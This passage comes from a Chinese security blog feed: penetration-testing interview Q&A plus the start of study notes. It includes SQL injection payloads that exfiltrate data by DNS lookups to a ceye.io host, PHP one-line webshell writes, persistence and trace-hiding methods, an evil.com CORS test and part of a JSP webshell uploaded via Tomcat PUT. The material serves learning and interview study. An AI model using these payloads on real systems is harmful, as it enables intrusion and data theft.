下又如何？</h3><p>答：</p><blockquote><p>（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。</p><p>（2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。</p><p>（3）Mysql 中利用 load_file() 构造payload</p><p>‘ and if((select load_file(concat(‘\\’,(select database()),’.xxx.ceye.io\abc’))),1,0)# </p><p>（4）Mssql 下利用 master..xp_dirtree 构造payload</p><p>DECLARE @host varchar(1024);SELECT @host&#x3D;(SELECT db_name())+’.xxx.ceye.io’;EXEC(‘master..xp_dirtree”\’+@host+’\foobar$”‘);</p></blockquote><h3 id="问：phpmyadmin写sehll的方法"><a href="#问：phpmyadmin写sehll的方法" class="headerlink" title="问：phpmyadmin写sehll的方法"></a>问：phpmyadmin写sehll的方法</h3><p>答：</p><p>一、常规导入shell的操作</p><blockquote><p>创建数据表导出shell</p><p>CREATE TABLE <code>mysql</code>.<code>shadow9</code> (<code>content</code> TEXT NOT NULL );</p><p>INSERT INTO <code>mysql</code>.<code>shadow9</code> (<code>content</code> ) VALUES (‘<?php @eval($_POST[pass]);?>’);</p><p>SELECT <code>content</code> FROM <code>shadow9</code> INTO OUTFILE ‘C:\phpStudy\WWW\90sec.php’;</p><p>DROP TABLE IF EXISTS <code>shadow9</code>;</p></blockquote><p>二、一句话导出shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27; into outfile &#x27;c:/phpstudy/www/90sec.php&#x27;;   select &#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27; into outfile &#x27;c:\\phpstudy\\www\\90sec.php&#x27;; select &#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27; into dumpfile &#x27;c:\\phpstudy\\www\\bypass.php&#x27;;</span><br></pre></td></tr></table></figure><p>三、日志备份获取shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &quot;%genera%&quot;;          //查询general_log配置 set global general_log=&#x27;on&#x27;;              //开启general log模式 SET global general_log_file=&#x27;D:/phpStudy/WWW/cmd.php&#x27;;    //设置日志文件保存路径 SELECT &#x27;&lt;?php phpinfo();?&gt;&#x27;;              //phpinfo()写入日志文件 set global general_log=&#x27;off&#x27;;              //关闭general_log模式</span><br></pre></td></tr></table></figure><h3 id="问：权限维持的方法"><a href="#问：权限维持的方法" class="headerlink" title="问：权限维持的方法"></a>问：权限维持的方法</h3><p>答：</p><p>留自启动后门方法很多,大多数都添加到服务,加注册表 加启动项，</p><p><strong>windows：</strong></p><blockquote><p>1.替换系统文件类(shift后门,放大镜后门)</p><p>2.修改注册表类</p><p>自启动项、屏幕保护程序注册表、用户登陆初始化、登录脚本、映像劫持、影子账户、AppCertDlls注册表项、AppInit_DLLs注册表项、文件关联、用户登陆初始化、xx.Netsh Helper DLL</p><p>3.文件类</p><p>自启动文件夹、office Word StartUp劫持</p><p>4.计划任务</p><p>schtasks 、WMI、bitsadmin</p></blockquote><p><strong>Linux</strong></p><blockquote><p>1.预加载型动态链接库后门</p><p>2.strace后门</p><p>3.SSH 后门</p><p>4.SUID后门</p><p>5.inetd服务后门</p><p>6.协议后门</p><p>7.vim后门</p><p>8.PAM后门</p><p>9.进程注入</p><p>10.Rootkit</p><p>11.端口复用</p></blockquote><p><strong>MSF权限维持</strong></p><blockquote><p>1.Persistence模块</p><p>2.Metsvc 模块</p></blockquote><p><strong>Powershell权限维持</strong></p><p><strong>CS权限维持</strong></p><blockquote><p>SC命令</p></blockquote><h3 id="问：XXE-漏洞原理，代码审计如何寻找？"><a href="#问：XXE-漏洞原理，代码审计如何寻找？" class="headerlink" title="问：XXE 漏洞原理，代码审计如何寻找？"></a>问：XXE 漏洞原理，代码审计如何寻找？</h3><p>答：</p><p>（1）XXE （XML 外部实体注入）当 应用允许引用 XML 外部实体时，攻击者通过构造恶意内容，就可能进行任意文件读取、系统命令执行、内网端口探测、内网网站攻击等操作。</p><p>支持的协议如下图：</p><p><a href="https://image.3001.net/images/20200228/1582890916_5e58ffa4c2932.png"><img src="https://image.3001.net/images/20200228/1582890916_5e58ffa4c2932.png!small" alt="img"></a></p><p><strong>Java</strong> :支持http、https、file、ftp、mailto、jar、netdoc、（1.8不支持gopher）</p><p>（2）审计函数，涉及到XML文件处理，都可能造成 XXE</p><p>（3）防御方法：禁用外部实体</p><h3 id="问：SSRF-禁用-127-0-0-1-后如何绕过，支持哪些协议？"><a href="#问：SSRF-禁用-127-0-0-1-后如何绕过，支持哪些协议？" class="headerlink" title="问：SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？"></a>问：SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？</h3><p>答：</p><blockquote><p>(1)利用进制转换</p><p>(2)利用DNS解析</p><p>(3)利用句号（127。0。0。1）</p><p>(4)利用[::]（http:&#x2F;&#x2F;[::]:80&#x2F;）；</p><p>(5)利用@（<a href="http://example.com@127.0.0.1/">http:&#x2F;&#x2F;example.com@127.0.0.1</a>）；</p><p>(6)利用短地址（<a href="http://dwz.cn/11SMa%EF%BC%89%EF%BC%9B">http://dwz.cn/11SMa）；</a></p><p>(7)协议（Dict:&#x2F;&#x2F;、SFTP:&#x2F;&#x2F;、TFTP:&#x2F;&#x2F;、LDAP:&#x2F;&#x2F;、Gopher:&#x2F;&#x2F;）</p></blockquote><h3 id="问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件"><a href="#问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件" class="headerlink" title="问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件"></a>问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件</h3><p>答：</p><blockquote><p>(1)任务管理器netstat -anp寻找异常进程PID看端口信息，然后根据端口信息定位到文件，cd &#x2F;proc&#x2F;PID （ls -l查看），</p><p>禁用可疑的服务项。</p><p>(2)windows还可以用wmic分析进程参数</p></blockquote><h3 id="问：struts2框架漏洞原理"><a href="#问：struts2框架漏洞原理" class="headerlink" title="问：struts2框架漏洞原理"></a>问：struts2框架漏洞原理</h3><p>答：</p><blockquote><p>(1)struts是java的web框架</p><p>(2)采取OGNL表达式，处理view层数据字符串到controller层转换成java对象</p><p>(3)重点关注的编号加粗如下</p></blockquote><p>S2-057 影响范围非常小</p><p>S2-048 影响范围非常小</p><p><strong>S2-046 和S2-045一样</strong></p><p><strong>S2-045 影响范围较大—-通过Content-Type这个header头，进而执行命令，通过Strus2对错误消息处理进行回显</strong></p><p>S2-037 影响范围小</p><p>S2-032 影响范围小</p><p>S2-020 影响范围小</p><p>S2-019 影响范围一般</p><p><strong>S2-016 影响范围非常大</strong></p><p>S2-013 S2-016范围内</p><p>S2-009 S2-016范围内</p><p>S2-005 S2-016范围内</p><h3 id="问：JAVA反序列化原理"><a href="#问：JAVA反序列化原理" class="headerlink" title="问：JAVA反序列化原理"></a>问：JAVA反序列化原理</h3><p>答：</p><blockquote><p>（1）Java序列化指Java对象转换为字节序列的过程</p><p>（2）Java反序列化指字节序列恢复为Java对象的过程</p><p>（3） Commons-collections 爆出第一个漏洞开始，Java反序列化漏洞的事件就层出不穷。</p><p>（4）在Java中,利用ObjectInputStream的readObject方法进行对象读取</p><p>（5）可以深入了解 ysoserial有哪些gadgets</p></blockquote><h3 id="问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？"><a href="#问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？" class="headerlink" title="问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？"></a><strong>问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？</strong></h3><p>答：</p><p>（1）CORS全称是”跨域资源共享”（Cross-origin resource sharing）,Origin源未严格，从而造成跨域问题,允许浏览器向跨源服务器，发出<a href="http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html">XMLHttpRequest</a>请求</p><p>（2）Origin为*的时候，使用curl测试CORS，</p><p>curl <url> -H “Origin: <a href="https://evil.com/">https://evil.com</a>” -I</p><p>再寻找的api接口是否有敏感信息泄漏。</p><p>（3）同源：协议相同、域名相同、端口相同，绕过同源策略限制的方法：</p><blockquote><p>1、document.domain属性</p><p>2、片段识别符（URL后加#号）</p><p>3、window.name</p><p>4、跨文档通信API</p><p>5、JSONP</p><p>6、CORS</p><p>7、WebSockets</p></blockquote><p>（4）jsonp跨域利用：获取JSON数据并编码发送到远程服务器上</p><h3 id="问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？"><a href="#问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？" class="headerlink" title="问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？"></a>问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？</h3><p>答：</p><p>（1）可以Bypass一些waf，绕过上传限制</p><p>（2）Phar反序列化，Phar:&#x2F;&#x2F; 伪协议读取phar文件时，会反序列化meta-data储存</p><p>（3） 区别</p><blockquote><p>一、 application&#x2F;x-www-form-urlencoded 或 multipart&#x2F;form-data时</p><p>php:&#x2F;&#x2F;input 中是原始数据。</p><p>$_POST 中是关联数组，且没有上传控件的内容。</p><p>二、enctype&#x3D;”multipart&#x2F;form-data” 时</p><p>php:&#x2F;&#x2F;input 是无效的。</p><p>三、 Content-Type &#x3D; “text&#x2F;plain”时 </p><p>$_POST 不能获取post的数据， php:&#x2F;&#x2F;input可以。</p></blockquote><h3 id="问：内网服务器，如何进行信息收集"><a href="#问：内网服务器，如何进行信息收集" class="headerlink" title="问：内网服务器，如何进行信息收集"></a>问：内网服务器，如何进行信息收集</h3><h3 id="答："><a href="#答：" class="headerlink" title="答："></a>答：</h3><p>（1）手动，用一些小工具（批量看存活）</p><p>new user &#x2F;domain查域、net view看共享、hosts文件内网ip域名映射、wifi记录和密码、浏览器中的密码、敏感文件、各类服务的配置文件中信息、历史命令、ssh私钥、FTP的连接信息、xshell等ssh连接工具的session文件，3389连接历史和被连接历史信息、某些内网api接口未授权访问</p><p>（2）扫描器</p><p>主机扫描、端口扫描、漏洞扫描、识别内网环境、密码爆破、抓密码</p><p>（3）留后门，抓信息</p><h3 id="问：内网黄金票据、白银票据的区别和利用方式"><a href="#问：内网黄金票据、白银票据的区别和利用方式" class="headerlink" title="问：内网黄金票据、白银票据的区别和利用方式"></a>问：内网黄金票据、白银票据的区别和利用方式</h3><p>答：</p><p>（1）白银票据：抓取到了域控服务hash的情况下，在客户端以一个普通域用户的身份生成TGS票据，并且是针对于某个机器上的某个服务的，生成的白银票据,只能访问指定的target机器中指定的服务。</p><p>黄金票据：直接抓取域控中账号的hash，来在client端生成一个TGT票据，那么该票据是针对所有机器的所有服务。</p><p>（2）通过mimkatz执行，导出域控中账号的Hash</p><h3 id="问：docker远程api漏洞原理"><a href="#问：docker远程api漏洞原理" class="headerlink" title="问：docker远程api漏洞原理"></a>问：docker远程api漏洞原理</h3><p>答：</p><p>（1）docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，该未授权访问,可以通过url操作，执行docker命令。</p><p>（2）通过docker client执行目标服务器容器命令，docker是以root权限运行的</p><p>一、有运行ssh服务，&#x2F;root&#x2F;.ssh目录挂载到container内，，然后修改&#x2F;.ssh&#x2F;authorized_keys 文件，把自己的public key写进去</p><p>二、没有运行ssh服务，利用挂载写crontab定时任务，反弹一个shell</p><h3 id="问：ssrf怎么用redis写shell"><a href="#问：ssrf怎么用redis写shell" class="headerlink" title="问：ssrf怎么用redis写shell"></a>问：ssrf怎么用redis写shell</h3><p>答：</p><p>（1）SSRF服务端请求伪造</p><blockquote><p>一、对内网扫描，获取 banner </p><p>二、攻击运行在内网的应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</p><p>三、利用协议读取本地文件</p><p>四、 云计算环境AWS Google Cloud 环境可以调用内网操作 ECS 的 API</p></blockquote><p>（2）如webligic SSRF漏洞</p><p>通过SSRF的gopher协议操作内网的redis，利用redis将反弹shell写入crontab定时任务，url编码，将\r字符串替换成%0d%0a</p><h3 id="问：预编译能否100-防sql注入，如果不能，写一个"><a href="#问：预编译能否100-防sql注入，如果不能，写一个" class="headerlink" title="问：预编译能否100%防sql注入，如果不能，写一个"></a><strong>问：预编译能否100%防sql注入，如果不能，写一个</strong></h3><p>答：</p><p>不能。</p><p>一、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$pdo-&gt;query(&#x27;SET NAMES gbk&#x27;);</span><br><span class="line">$var = &quot;\xbf\x27 OR 1=1 /*&quot;;</span><br><span class="line">$query = &#x27;SELECT * FROM test WHERE name = ? LIMIT 1&#x27;;</span><br><span class="line">$stmt = $pdo-&gt;prepare($query);</span><br><span class="line">$stmt-&gt;execute(array($var));</span><br></pre></td></tr></table></figure><p>类似于宽字节注入</p><p>二、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$dbh = new PDO(&quot;txf&quot;);</span><br><span class="line">$name = $_GET[&#x27;name&#x27;];</span><br><span class="line">$stmt = $dbh-&gt;prepare(&#x27;SELECT * FROM &#x27; . $name . &#x27; where username = :username&#x27;);</span><br><span class="line">$stmt-&gt;execute( array(&#x27;:username&#x27; =&gt; $_REQUEST[&#x27;username&#x27;]) );</span><br></pre></td></tr></table></figure><p>参数name是一串数组，PDO不会生效</p><p>三、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $dbh-&gt;prepare(&#x27;SELECT * FROM foo ORDER BY :userSuppliedData&#x27;);</span><br></pre></td></tr></table></figure><p>PDO对DDL不生效</p><h3 id="问：WAF-绕过"><a href="#问：WAF-绕过" class="headerlink" title="问：WAF 绕过"></a>问：WAF 绕过</h3><p>答：</p><blockquote><p>1 注释替换空格 </p><p>2 字符集绕过</p><p>3 chunked绕过</p><p>4 上传请求 multipart 绕过</p><p>5.参数污染</p><p>。。。</p></blockquote><h3 id="问：SQL注入构造payload"><a href="#问：SQL注入构造payload" class="headerlink" title="问：SQL注入构造payload"></a>问：SQL注入构造payload</h3><p>答：</p><p>一、布尔型盲注</p><p>(1)mysql :</p><p>‘and (length(database()))&gt;10 –+</p><p>(2)oracle:</p><p>‘ and 1&#x3D;(select decode(user,’SCOTT’,1,0) from dual) –</p><p>二、时间型盲注</p><p>and if(ascii(substr((select database()),1,1))&gt;115,1,sleep(5))</p><p>三、利用报错回显</p><p>(1) extractvalue</p><p>and extractvalue(1,concat(0x7e,(select database())))</p><p>(2) updatexml</p><p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</p><h3 id="问：UDF提权原理"><a href="#问：UDF提权原理" class="headerlink" title="问：UDF提权原理"></a>问：UDF提权原理</h3><p>答：利用了root 高权限，创建带有调用cmd的函数的udf.dll动态链接库，导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd</p><h3 id="问：提权方式"><a href="#问：提权方式" class="headerlink" title="问：提权方式"></a>问：提权方式</h3><p>答：</p><p>windows:</p><blockquote><p>1.systminfo ,根据系统补丁提权</p><p>2.第三方服务提权</p><p>3.数据库提权</p><p>。。。</p></blockquote><p>linux:</p><blockquote><p>1.利用系统内核漏洞进行提权 </p><p>2.泄漏密码提权</p><p>3.sudo提权</p><p>4.SUID提权</p><p>。。。</p></blockquote><h3 id="问：XSS弹窗函数及常见的-XSS-绕过策略"><a href="#问：XSS弹窗函数及常见的-XSS-绕过策略" class="headerlink" title="问：XSS弹窗函数及常见的 XSS 绕过策略"></a><strong>问：XSS弹窗函数及常见的 XSS 绕过策略</strong></h3><p>答：</p><p>一、alert,confirm,prompt三种函数</p><p>二、绕过策略</p><blockquote><p>\1. 大小写混合</p><p>\2. 双写</p><p>3.编码</p><p>\4. fuzz 低频使用标签 &lt;details&#x2F;open&#x2F;ontoggle&gt;</p><p>\5. fuzz 低频使用函数 ontoggle 等</p><p>6.&lt;img&#x2F;src&#x3D;1&gt;</p><p>7.%0a或者%0d绕过</p></blockquote><h3 id="问：Windows-cmd-如何下载文件"><a href="#问：Windows-cmd-如何下载文件" class="headerlink" title="问：Windows cmd 如何下载文件"></a>问：Windows cmd 如何下载文件</h3><p>答：</p><blockquote><p>1.certutil.exe</p><p>2.powershell</p><p>3.bitsadmin</p><p>4.vbs</p><p>5.ftp</p></blockquote><h3 id="问：SVN-x2F-GIT源代码泄露"><a href="#问：SVN-x2F-GIT源代码泄露" class="headerlink" title="问：SVN&#x2F;GIT源代码泄露"></a><strong>问：SVN&#x2F;GIT源代码泄露</strong></h3><p>答：</p><blockquote><p>（1）在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息</p><p>&#x2F;.git&#x2F;config</p><p>（2）使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞</p><p>&#x2F;.svn&#x2F;entries</p></blockquote><h3 id="问：reverse-tcp-和-bind-tcp-的区别"><a href="#问：reverse-tcp-和-bind-tcp-的区别" class="headerlink" title="问：reverse_tcp 和 bind_tcp 的区别"></a>问：reverse_tcp 和 bind_tcp 的区别</h3><p>答：</p><p>（1）reverse_tcp</p><p>木马会主动连接目标服务器</p><p>（2）bind_tcp</p><p>木马会监听本地的端口</p><h3 id="什么是fastjson-有哪些漏洞？"><a href="#什么是fastjson-有哪些漏洞？" class="headerlink" title="什么是fastjson,有哪些漏洞？"></a>什么是fastjson,有哪些漏洞？</h3><p>答：</p><p>（1）Fastjson是Alibaba开发的Java语言编写的高性能JSON库</p><p>（2）攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE</p><p>（3）fastjson漏洞历史</p><p>1.fastjson-1.2.24</p><p>(fastjson接受的JSON可以通过艾特type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作)</p><p>2.fastjson-1.248以下</p><p>(checkAutoType中使用TypeUtils.getClassFromMapping(typeName)去获取class不为空，从而绕过了黑名单检测)</p><p>3.fastjson-1.2.60以下</p><p>(在此版本以下，字符串中包含\x转义字符时可以造成dos漏洞)</p><h3 id="问：隐藏攻击痕迹的方法"><a href="#问：隐藏攻击痕迹的方法" class="headerlink" title="问：隐藏攻击痕迹的方法"></a>问：隐藏攻击痕迹的方法</h3><p>答：</p><blockquote><p>1.跳板</p><p>2.代理服务器</p><p>3.Tor</p><p>4.日志</p><p>5.清除历史记录</p><p>6.粉碎文件</p></blockquote><h2 id="理解漏洞"><a href="#理解漏洞" class="headerlink" title="理解漏洞"></a>理解漏洞</h2><p>讲诉一些近期及有代表性的漏洞</p><h3 id="Microsoft-Exchange-Net反序列化远程代码执行-CVE-2020-0688"><a href="#Microsoft-Exchange-Net反序列化远程代码执行-CVE-2020-0688" class="headerlink" title="Microsoft Exchange .Net反序列化远程代码执行(CVE-2020-0688)"></a>Microsoft Exchange .Net反序列化远程代码执行(CVE-2020-0688)</h3><p>该漏洞是由于Exchange控制面板（ECP）组件中使用了静态密钥validationKey和decryptionKey</p><h3 id="Apache-Tomcat-文件包含漏洞-CVE-2020-1938"><a href="#Apache-Tomcat-文件包含漏洞-CVE-2020-1938" class="headerlink" title="Apache Tomcat 文件包含漏洞(CVE-2020-1938)"></a>Apache Tomcat 文件包含漏洞(CVE-2020-1938)</h3><p>默认情况下,Tomcat会开启AJP连接器, Tomcat在AJP协议的实现上存在漏洞,导致攻击者可以通过发送恶意的请求,可以读取或者包含Web根目录下的任意文件,配合文件上传，将导致任意代码执行(RCE)</p><h3 id="Weblogic-IIOP反序列化漏洞（CVE-2020-2551）"><a href="#Weblogic-IIOP反序列化漏洞（CVE-2020-2551）" class="headerlink" title="Weblogic IIOP反序列化漏洞（CVE-2020-2551）"></a>Weblogic IIOP反序列化漏洞（CVE-2020-2551）</h3><p>weblogic核心组件中IIOP协议，通过该协议对存在漏洞的WebLogic进行远程代码执行的攻击</p><h3 id="Apache-Solr远程代码执行（CVE-2019-12409）"><a href="#Apache-Solr远程代码执行（CVE-2019-12409）" class="headerlink" title="Apache Solr远程代码执行（CVE-2019-12409）"></a>Apache Solr远程代码执行（CVE-2019-12409）</h3><p>默认配置文件solr.in.sh,在其配置文件中ENABLE_REMOTE_JMX_OPTS字段默认配置不安全.如果使用默认配置,将启用JMX监视服务并将对公网监听18983的RMI端口,无需任何验证,配合JMX RMI远程代码执行</p><h3 id="SHIRO-550-反序列化漏洞"><a href="#SHIRO-550-反序列化漏洞" class="headerlink" title="SHIRO-550 反序列化漏洞"></a>SHIRO-550 反序列化漏洞</h3><p>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：</p><p>得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化</p><p>AES的密钥是硬编码在代码里，就导致了反序列化的RCE漏洞</p><h3 id="SHIRO-721反序列化漏洞"><a href="#SHIRO-721反序列化漏洞" class="headerlink" title="SHIRO-721反序列化漏洞"></a>SHIRO-721反序列化漏洞</h3><p>不需要key，利用Padding Oracle Attack构造出RememberMe字段后段的值结合合法的RememberMe cookie即可完成攻击</p><h3 id="泛微Ecology-OA-SQL注入漏洞"><a href="#泛微Ecology-OA-SQL注入漏洞" class="headerlink" title="泛微Ecology OA SQL注入漏洞"></a>泛微Ecology OA SQL注入漏洞</h3><p>validate.jsp接口的SQL注入，&#x2F;cpt&#x2F;manage&#x2F;validate.jsp</p><h3 id="泛微ecology-OA系统接口存在数据库配置信息泄露"><a href="#泛微ecology-OA系统接口存在数据库配置信息泄露" class="headerlink" title="泛微ecology OA系统接口存在数据库配置信息泄露"></a>泛微ecology OA系统接口存在数据库配置信息泄露</h3><p>&#x2F;mobile&#x2F;dbconfigreader.jsp,直接访问该页面将为DES加密以后的乱码,使用DES算法结合硬编码的key进行解密</p><h3 id="Confluence本地文件泄露漏洞-CVE-2019-3394"><a href="#Confluence本地文件泄露漏洞-CVE-2019-3394" class="headerlink" title="Confluence本地文件泄露漏洞(CVE-2019-3394)"></a>Confluence本地文件泄露漏洞(CVE-2019-3394)</h3><p>catalina.jar中的org.apache.catalina.webresources.StandardRoot.class的getResource方法的validate存在过滤和限制，所以可遍历路径均在&#x2F;WEB-INF下</p><h3 id="Apache-Dubbo反序列化漏洞（CVE-2019-17564）"><a href="#Apache-Dubbo反序列化漏洞（CVE-2019-17564）" class="headerlink" title="Apache Dubbo反序列化漏洞（CVE-2019-17564）"></a>Apache Dubbo反序列化漏洞（CVE-2019-17564）</h3><p>当HTTP remoting 开启的时候，存在反序列化漏洞</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;近期面试喜欢问的问题，总结了一下。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;岗位分析&quot;&gt;&lt;a href=&quot;#岗位分析&quot; c</summary>
      
    
    
    
    <category term="面试题" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
    
    <category term="渗透" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="面试题" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>3-23</title>
    <link href="http://example.com/2020/03/23/3.23/"/>
    <id>http://example.com/2020/03/23/3.23/</id>
    <published>2020-03-23T01:55:34.000Z</published>
    <updated>2020-03-23T09:30:32.263Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://www.xt996.top/muggle/2020/03/23/3.23/nice.png"></p><p>学习免杀工具、注册表修改时间、CVE漏洞、流量分析</p><span id="more"></span><h1 id="Xencrypt-免杀powershell"><a href="#Xencrypt-免杀powershell" class="headerlink" title="Xencrypt(免杀powershell)"></a>Xencrypt(免杀powershell)</h1><p>一款基于PowerShell脚本实现的反病毒绕过工具(免杀powershell)</p><blockquote><p><a href="https://github.com/the-xentropy/xencrypt">https://github.com/the-xentropy/xencrypt</a></p></blockquote><p>这里有稍微详细一点的教程</p><blockquote><p><a href="https://blog.csdn.net/lhh134/article/details/104640758">https://blog.csdn.net/lhh134/article/details/104640758</a></p></blockquote><h1 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h1><h2 id="注册表文件路径"><a href="#注册表文件路径" class="headerlink" title="注册表文件路径"></a>注册表文件路径</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\config</span><br></pre></td></tr></table></figure><p>文件导出，注册表打开该目录下SYSTEM等文件查看</p><h2 id="查看注册表中某一项修改时间"><a href="#查看注册表中某一项修改时间" class="headerlink" title="查看注册表中某一项修改时间"></a>查看注册表中某一项修改时间</h2><p>第三方注册表工具 例如:Registry Workshop</p><p>打开即可查看修改时间</p><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>PUT &#x2F;FxCodeShell.jsp%20 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.util.Arrays&quot;%&gt;</span><br><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String view = request.getParameter(&quot;view&quot;);</span><br><span class="line">    if (view == null || view.equals(&quot;&quot;)) &#123;</span><br><span class="line">        String localOS = System.getProperty(&quot;os.name&quot;);</span><br><span class="line">        List&lt;String&gt; osList;</span><br><span class="line">        String tomcatOS = &quot;0&quot;;</span><br><span class="line">        String DEFAULT = &quot;0&quot;;</span><br><span class="line">        String WINDOWS = &quot;1&quot;;</span><br><span class="line">        String LINUX = &quot;2&quot;;</span><br><span class="line">        osList = new ArrayList&lt;String&gt;();</span><br><span class="line">        osList.add(&quot;Linux&quot;);</span><br><span class="line">        osList.add(&quot;Windows&quot;);</span><br><span class="line">        for (String os : osList) &#123;</span><br><span class="line">            if (localOS.contains(os)) &#123;</span><br><span class="line">                if (os.equals(&quot;Linux&quot;)) &#123;</span><br><span class="line">                    tomcatOS = LINUX;</span><br><span class="line">                &#125; else if (os.equals(&quot;Windows&quot;)) &#123;</span><br><span class="line">                    tomcatOS = WINDOWS;</span><br><span class="line">                